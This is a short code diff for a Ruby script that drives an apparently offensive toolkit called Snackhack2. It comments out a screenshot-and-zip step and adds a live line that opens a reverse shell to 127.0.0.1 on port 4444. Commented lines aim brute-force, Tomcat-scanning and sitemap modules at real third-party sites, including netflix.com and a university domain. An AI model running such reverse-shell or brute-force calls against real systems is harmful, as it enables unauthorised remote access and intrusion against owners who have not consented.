@@ -123,8 +123,10 @@ s.run
 # sm = Snackhack2::SiteMap.new("https://cryptogrinders.us")
 # tc = Snackhack2::TomCat.new("https://recrutements-ec.univ-lille.fr")
 # tc.run
-
+=begin
 ss = Snackhack2::ScreenShot.new
 ss.zip = "test.zip"
 ss.run
 # Snackhack2::brute_force("https://netflix.com")
+=end
+Snackhack2::ReverseShell.new("127.0.0.1", "4444").bash
